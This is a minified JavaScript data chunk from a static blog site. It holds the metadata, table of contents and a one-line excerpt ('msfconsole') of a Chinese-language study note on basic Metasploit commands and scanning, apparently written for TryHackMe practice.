h=i(l,[["render",t],["__file","Metasploit.html.vue"]]),c=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/THM/Metasploit/Metasploit.html","title":"Metasploit","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-03-31T00:00:00.000Z","tags":null,"title":"Metasploit","category":["项目"],"description":"基础命令 启动Metasploit info 可以获得上下文模块信息 📌 总结 通过 info 命令，你可以高效掌握模块的关键信息，避免盲目配置！ 🚀 unset 基本用法 或取消所有选项： setg ** 基本语法** 全局设置，如果想撤销全局设置可以用unsetg setg会被模块内的set覆盖 search ** 基本语法** 常用选项： m...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/THM/Metasploit/Metasploit.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"Metasploit"}],["meta",{"property":"og:description","content":"基础命令 启动Metasploit info 可以获得上下文模块信息 📌 总结 通过 info 命令，你可以高效掌握模块的关键信息，避免盲目配置！ 🚀 unset 基本用法 或取消所有选项： setg ** 基本语法** 全局设置，如果想撤销全局设置可以用unsetg setg会被模块内的set覆盖 search ** 基本语法** 常用选项： m..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-10-18T12:29:48.000Z"}],["meta",{"property":"article:published_time","content":"2025-03-31T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-10-18T12:29:48.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Metasploit\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2025-03-31T00:00:00.000Z\\",\\"dateModified\\":\\"2025-10-18T12:29:48.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"基础命令","slug":"基础命令","link":"#基础命令","children":[{"level":3,"title":"启动Metasploit","slug":"启动metasploit","link":"#启动metasploit","children":[]},{"level":3,"title":"info","slug":"info","link":"#info","children":[]},{"level":3,"title":"unset","slug":"unset","link":"#unset","children":[]},{"level":3,"title":"setg","slug":"setg","link":"#setg","children":[]},{"level":3,"title":"search","slug":"search","link":"#search","children":[]},{"level":3,"title":"msf模块分类","slug":"msf模块分类","link":"#msf模块分类","children":[]},{"level":3,"title":"编码","slug":"编码","link":"#编码","children":[]},{"level":3,"title":"规避","slug":"规避","link":"#规避","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]},{"level":3,"title":"NOP","slug":"nop","link":"#nop","children":[]},{"level":3,"title":"payload","slug":"payload","link":"#payload","children":[]},{"level":3,"title":"POST","slug":"post","link":"#post","children":[]}]},{"level":2,"title":"端口扫描","slug":"端口扫描","link":"#端口扫描","children":[{"level":3,"title":"UDP扫描","slug":"udp扫描","link":"#udp扫描","children":[]},{"level":3,"title":"SMB扫描","slug":"smb扫描","link":"#smb扫描","children":[]},{"level":3,"title":"数据库功能","slug":"数据库功能","link":"#数据库功能","children":[]}]}],"git":{"createdTime":1743671903000,"updatedTime":1760790588000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":579,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":5.59,"words":1677},"filePathRelative":"article/01_项目/THM/Metasploit/Metasploit.md","localizedDate":"2025年3月31日","excerpt":"<h2>基础命令</h2>\\n<h3>启动Metasploit</h3>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>msfconsole</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{h as comp,c as data};
